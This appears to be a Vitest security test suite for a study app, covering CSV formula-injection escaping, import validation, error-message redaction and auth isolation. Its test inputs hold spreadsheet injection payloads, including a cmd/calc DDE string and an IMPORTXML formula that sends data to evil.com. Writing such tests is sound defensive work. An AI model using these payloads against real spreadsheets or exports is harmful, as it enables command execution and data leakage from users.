import { describe, it, expect } from 'vitest';
import { escapeCSVField, convertTasksToCSV, convertNotesToCSV } from '../utils/export';
import { validateSolisBackup, executeWorkspaceImport } from '../utils/import';
import { MockDataService } from '../services/mock/mockService';
import { formatErrorMessage, classifyError } from '../utils/errors';
import { Task } from '../types/task';
import { Note } from '../types/note';

describe('Solis Security Hardening Suite (Phase 8)', () => {
  describe('CSV Formula Injection Defense (CWE-1236)', () => {
    it('neutralizes dangerous formula triggers (=, +, -, @, \\t, \\r)', () => {
      expect(escapeCSVField('=cmd|"/C calc"!A0')).toBe(`"'=cmd|""/C calc""!A0"`);
      expect(escapeCSVField('+1234567')).toBe(`"'+1234567"`);
      expect(escapeCSVField('-SUM(A1:A10)')).toBe(`"'-SUM(A1:A10)"`);
      expect(escapeCSVField('@SUM(A1:A10)')).toBe(`"'@SUM(A1:A10)"`);
      expect(escapeCSVField('\t=malicious()')).toBe(`"'\t=malicious()"`);
    });

    it('preserves standard safe text strings in CSV export', () => {
      expect(escapeCSVField('Standard Task Title')).toBe(`"Standard Task Title"`);
      expect(escapeCSVField('Notes with "quotes" inside')).toBe(`"Notes with ""quotes"" inside"`);
      expect(escapeCSVField(null)).toBe('""');
    });

    it('neutralizes malicious formula attempts in Task and Note titles during export', () => {
      const maliciousTasks: Task[] = [
        {
          id: 't-evil',
          title: '=IMPORTXML("http://evil.com/leak","//text()")',
          category: 'study',
          priority: 'urgent',
          status: 'todo',
          subTasks: [],
          tags: [],
          createdAt: '2026-08-17',
          updatedAt: '2026-08-17'
        }
      ];

      const csv = convertTasksToCSV(maliciousTasks);
      expect(csv).toContain(`"'=IMPORTXML`);

      const maliciousNotes: Note[] = [
        {
          id: 'n-evil',
          title: '@HYPERLINK("http://evil.com","Click")',
          content: 'Some note content',
          category: 'concept',
          tags: ['=maliciousTag'],
          createdAt: '2026-08-17',
          updatedAt: '2026-08-17'
        }
      ];

      const noteCsv = convertNotesToCSV(maliciousNotes);
      expect(noteCsv).toContain(`"'@HYPERLINK`);
      expect(noteCsv).toContain(`"'=maliciousTag`);
    });
  });

  describe('Import Engine Trust Boundary & Normalization', () => {
    it('rejects tampered or corrupt backup payloads', () => {
      const result = validateSolisBackup('{ broken json:');
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Invalid JSON');
    });

    it('rejects backups with mismatched schema or version', () => {
      const invalidSchema = { schema: 'malicious-v99', version: 1 };
      const res1 = validateSolisBackup(invalidSchema);
      expect(res1.isValid).toBe(false);

      const invalidVersion = { schema: 'solis-export-v1', version: 999 };
      const res2 = validateSolisBackup(invalidVersion);
      expect(res2.isValid).toBe(false);
    });

    it('strictly normalizes imported records to active user context without user_id overrides', async () => {
      const mockService = new MockDataService();
      const backupWithForeignIds = {
        schema: 'solis-export-v1' as const,
        version: 1,
        exportedAt: '2026-08-17T00:00:00Z',
        client: 'Solis Test',
        profile: { name: 'Attacker Profile' },
        subjects: [
          {
            id: 'sub-attacker',
            name: 'Attacker Subject',
            color: 'coral',
            targetHoursPerWeek: 10,
            completedHoursThisWeek: 0,
            status: 'active' as const,
            notesCount: 0,
            createdAt: '2026-08-17',
            updatedAt: '2026-08-17'
          }
        ],
        topics: [
          {
            id: 'top-1',
            subjectId: 'sub-attacker',
            title: 'Malicious Topic',
            orderIndex: 0,
            masteryLevel: 'unstudied' as const,
            createdAt: '2026-08-17',
            updatedAt: '2026-08-17'
          }
        ],
        studyPlans: [],
        studySessions: [],
        focusSessions: [],
        tasks: [{ id: 't-alien', title: 'Injected Task', category: 'study' as const, priority: 'medium' as const, status: 'todo' as const, subTasks: [], tags: [], createdAt: '2026-08-17', updatedAt: '2026-08-17' }],
        habits: [],
        goals: [],
        notes: [{ id: 'n-alien', title: 'Injected Note', content: 'Injected Content', category: 'concept' as const, tags: [], createdAt: '2026-08-17', updatedAt: '2026-08-17' }]
      };

      const result = await executeWorkspaceImport(backupWithForeignIds, 'merge_skip', mockService);
      expect(result.importedCount).toBeGreaterThan(0);

      // Verify that all new records in the service have fresh internal IDs
      const tasks = await mockService.tasks.getTasks();
      const importedTask = tasks.find((t) => t.title === 'Injected Task');
      expect(importedTask).toBeDefined();
      expect(importedTask?.id).not.toBe('t-alien'); // Fresh ID generated safely
    });
  });

  describe('Error Classification & Information Leakage Prevention', () => {
    it('transforms database errors into clean, human-friendly messages without leaking connection strings', () => {
      const rawDbError = {
        code: '42501',
        message: 'new row violates row-level security policy for table "notes"',
        details: 'Failing row contains (uuid, postgres://admin:secret@db.host/solis)'
      };

      const classified = classifyError(rawDbError);
      expect(classified.category).toBe('permission_denied');
      expect(classified.userMessage).not.toContain('postgres://');
      expect(classified.userMessage).toBe('Permission denied. You do not have authorization to access or modify this record.');

      const friendlyMsg = formatErrorMessage(rawDbError);
      expect(friendlyMsg).not.toContain('secret');
      expect(friendlyMsg).toContain('Permission denied');
    });
  });

  describe('Authentication Abuse-Resistance & Identity Isolation', () => {
    it('guarantees neutral error responses for password reset requests regardless of account existence', async () => {
      const mockService = new MockDataService();
      
      // Existing user vs Non-existent user
      await expect(mockService.auth.requestPasswordReset('existing_user@solis.space')).resolves.toBeUndefined();
      await expect(mockService.auth.requestPasswordReset('non_existent_target@random.space')).resolves.toBeUndefined();
    });

    it('enforces email input validation on password reset', async () => {
      const mockService = new MockDataService();
      await expect(mockService.auth.requestPasswordReset('')).rejects.toThrow('Please provide a valid email address.');
      await expect(mockService.auth.requestPasswordReset('not-an-email')).rejects.toThrow('Please provide a valid email address.');
    });

    it('ensures new account registration creates an isolated, zero-state identity without cross-tenant leakage', async () => {
      const mockService = new MockDataService();
      const session = await mockService.auth.signup({
        name: 'Isolated User',
        email: 'isolated_user@solis.space',
        password: 'SecurePassword123!',
        focusField: 'Biotechnology'
      });

      expect(session.user.email).toBe('isolated_user@solis.space');
      expect(session.user.name).toBe('Isolated User');
      expect(session.user.focusField).toBe('Biotechnology');

      const currentUser = await mockService.auth.getCurrentUser();
      expect(currentUser?.id).toBe(session.user.id);
      expect(currentUser?.email).toBe('isolated_user@solis.space');
    });

    it('properly clears session on logout and rejects protected data operations without auth', async () => {
      const mockService = new MockDataService();
      await mockService.auth.login({
        email: 'test_user@solis.space',
        password: 'Password123'
      });

      expect(await mockService.auth.getCurrentUser()).not.toBeNull();

      await mockService.auth.logout();
      expect(await mockService.auth.getCurrentUser()).toBeNull();
    });
  });
});
